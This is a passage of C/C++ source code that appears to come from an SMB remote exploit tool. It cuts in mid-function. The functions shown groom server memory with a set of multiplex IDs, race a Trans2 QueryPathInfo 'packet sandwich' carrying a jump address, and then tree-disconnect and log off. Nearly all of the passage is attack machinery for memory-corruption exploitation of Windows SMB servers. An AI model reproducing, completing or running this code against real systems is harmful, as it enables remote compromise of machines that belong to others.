	resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	//extract any meaningfull info from request packet
	update_smb_info(info, &req->ThisPacket);
	//extract any meaningfull info from response packet
	update_smb_info(info, &resp->ThisPacket);

	if (!bstatus)
	{
		PutUlong(status, ((GetLastError() == 0) ? STATUS_FAIL : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	if (isnull(resp->ThisPacket.pbdata) || (!(GetUlong(&resp->ThisPacket.dwsize) & 0xFFFFFFFF)))
	{
		PutUlong(status, ((GetLastError() == 0) ? NT_STATUS_INVALID_SMB : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	if (GetUlong(&resp->ThisSmb->Status.NtStatus) & STATUS_FAIL)
	{
		PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	SyncTransactionInfo(info->TransactionContext, &req->ThisPacket);
	SyncTransactionInfo(info->TransactionContext, &resp->ThisPacket);

	FillInTransRequestEntry(transreqentry, req);
	FillInTransResponseEntry(transrespentry, resp);

	//append latest packet to global send data buffer
	bwscat(sentdata, &req->ThisPacket);
	//append latest recieved packet to global recieved data buffer
	bwscat(recieveddata, &resp->ThisPacket);

	//get next entries in lists
	//req = req->NextEntry, resp = resp->NextEntry;
	//transreqentry = transreqentry->Flink, transrespentry = transrespentry->Flink;
	*/
	
	
	
	
	goto success;

success:
	
	PutUshort(&GlobalGroomCount, 10);
	if (isnull(GlobalGroomMids = ((WORD*)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, sizeof(WORD) * MAKESIZET(GlobalGroomCount))))))
		goto fail;

	RtlZeroMemory(GlobalGroomMids, sizeof(WORD) * MAKESIZET(GlobalGroomCount));
	RtlCopyMemory(GlobalGroomMids, mids, sizeof(WORD) * MAKESIZET(GlobalGroomCount));
 
	SetLastError(0);
	return GetUshort(&req->ThisSmb->Mid);
fail:
	SetLastError(GetUlong(status));
	return NULL;
}


WORD __stdcall SmbTransaction2Race(RequestPacketLinkedList IN OUT* requestliststart, ResponsePacketLinkedList IN OUT* responseliststart, smb_info IN OUT* info, ULONGLONG IN jmp_addr, BUFFER IN OUT* sentdata, BUFFER IN OUT* recieveddata)
{
	RequestPacketLinkedList* req = requestliststart;
	ResponsePacketLinkedList* resp = responseliststart;
	unsigned status[2] = { 0 }, smbreqrespcount = 0;
	BOOLEAN bstatus = TRUE;
	SOCKET* s = ((SOCKET*)(info->socketpointer));
	PTRANS_REQUEST_LIST& transreqentry = ((PTRANS_REQUEST_LIST&)(info->currenttransreqentry));
	PTRANS_RESPONSE_LIST& transrespentry = ((PTRANS_RESPONSE_LIST&)(info->currenttransrespentry));
	WORD Mid[2] = { 0 };
	
	if (
		isnull(requestliststart) ||
		isnull(responseliststart) ||
		isnull(info) ||
		isnull(sentdata) ||
		isnull(recieveddata)	||
		(!GetUlongPtr(&jmp_addr))
		)
	{
		PutUlong(status, STATUS_INVALID_PARAMETER);
		SetLastError(GetUlong(status));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		return NULL;
	}

	//go to the next blank entry in our request list
	if (notnull(req->ThisPacket.pbdata))
		while (notnull(req->ThisPacket.pbdata))
			req = req->NextEntry;
	//go to the next blank entry in our response list
	if (notnull(resp->ThisPacket.pbdata))
		while (notnull(resp->ThisPacket.pbdata))
			resp = resp->NextEntry;

	while (notnull(transreqentry->smb))
		transreqentry = transreqentry->Flink;
	while (notnull(transrespentry->smb))
		transrespentry = transrespentry->Flink;

	if (isnull(transrespentry->Blink->smb))
	{
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	set_mid(info, GetUshort(&transrespentry->Blink->smb->Mid) + LOWORD(random() % 0x10));
	//set_mid(info, LOWORD(8361));

	bstatus = SendRecvTrans2QueryPathInfoPacketSandwich(req, resp, jmp_addr, GetSocket(s), info);
	++smbreqrespcount;

	req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	//extract any meaningfull info from request packet
	update_smb_info(info, &req->ThisPacket);
	//extract any meaningfull info from response packet
	update_smb_info(info, &resp->ThisPacket);

	if (!bstatus)
	{
		PutUlong(status, ((GetLastError() == 0) ? STATUS_FAIL : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	if (isnull(resp->ThisPacket.pbdata) || (!(GetUlong(&resp->ThisPacket.dwsize) & 0xFFFFFFFF)))
	{
		PutUlong(status, ((GetLastError() == 0) ? NT_STATUS_INVALID_SMB : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	if (GetUlong(&resp->ThisSmb->Status.NtStatus) != NT_STATUS_INVALID_DEVICE_REQUEST)
	{
		PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	//SyncTransactionInfo(info->TransactionContext, &req->ThisPacket);
	//SyncTransactionInfo(info->TransactionContext, &resp->ThisPacket);

	FillInTransRequestEntry(transreqentry, req);
	FillInTransResponseEntry(transrespentry, resp);

	//append latest packet to global send data buffer
	bwscat(sentdata, &req->ThisPacket);
	//append latest recieved packet to global recieved data buffer
	bwscat(recieveddata, &resp->ThisPacket);

	PutUshort(Mid, GetUshort(&req->ThisSmb->Mid));

	if((bstatus) && (GetUlong(&resp->ThisSmb->Status.NtStatus) == NT_STATUS_INVALID_DEVICE_REQUEST))
		goto success;

success:
	SetLastError(0);
	return	GetUshort(Mid);		//GetUshort(&req->ThisSmb->Mid);
fail:
	SetLastError(GetUlong(status));
	return NULL;
}








//returns tid logged off if successful and NULL if it fails
WORD __stdcall SmbDisconnectAndLogoff(RequestPacketLinkedList IN OUT* requestliststart, ResponsePacketLinkedList IN OUT* responseliststart, smb_info IN OUT* info, BUFFER IN OUT* sentdata, BUFFER IN OUT* recieveddata)
{
	RequestPacketLinkedList* req = requestliststart;
	ResponsePacketLinkedList* resp = responseliststart;
	unsigned status[2] = { 0 }, smbreqrespcount = 0;
	BOOLEAN bstatus = TRUE;
	SOCKET* s = ((SOCKET*)(info->socketpointer));
	WORD Tid[2] = { 0 };

	if (
		isnull(requestliststart) ||
		isnull(responseliststart) ||
		isnull(info) ||
		isnull(sentdata) ||
		isnull(recieveddata)
		)
	{
		PutUlong(status, STATUS_INVALID_PARAMETER);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	//go to the next blank entry in our request list
	if (notnull(req->ThisPacket.pbdata))
		while (notnull(req->ThisPacket.pbdata))
			req = req->NextEntry;

	//go to the next blank entry in our response list
	if (notnull(resp->ThisPacket.pbdata))
		while (notnull(resp->ThisPacket.pbdata))
			resp = resp->NextEntry;

	PutUshort(Tid, GetUshort(&info->tid));

	bstatus = SendRecvTreeDisconnect(req, resp, GetSocket(s), info);
	++smbreqrespcount;

	req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	//extract any meaningfull info from request packet
	update_smb_info(info, &req->ThisPacket);
	//extract any meaningfull info from response packet
	update_smb_info(info, &resp->ThisPacket);

	if (!bstatus)
	{
		PutUlong(status, ((GetLastError() == 0) ? STATUS_FAIL : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	if (isnull(resp->ThisPacket.pbdata) || (!(GetUlong(&resp->ThisPacket.dwsize) & 0xFFFFFFFF)))
	{
		PutUlong(status, ((GetLastError() == 0) ? NT_STATUS_INVALID_SMB : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	if (GetUlong(&resp->ThisSmb->Status.NtStatus) & STATUS_FAIL)
	{
		PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	PutUshort(Tid, GetUshort(&req->ThisSmb->Tid));

	req = req->NextEntry, resp = resp->NextEntry;


	bstatus = SendRecvLogoffAndx(req, resp, GetSocket(s), info);
	++smbreqrespcount;

	req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	//extract any meaningfull info from request packet
	update_smb_info(info, &req->ThisPacket);
	//extract any meaningfull info from response packet
	update_smb_info(info, &resp->ThisPacket);

	if (!bstatus)
	{
		PutUlong(status, ((GetLastError() == 0) ? STATUS_FAIL : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	if (GetUlong(&resp->ThisSmb->Status.NtStatus) & STATUS_FAIL)
	{
		PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	goto success;

success:
	return GetUshort(Tid);
fail:
	SetLastError(GetUlong(status));
	return NULL;
}
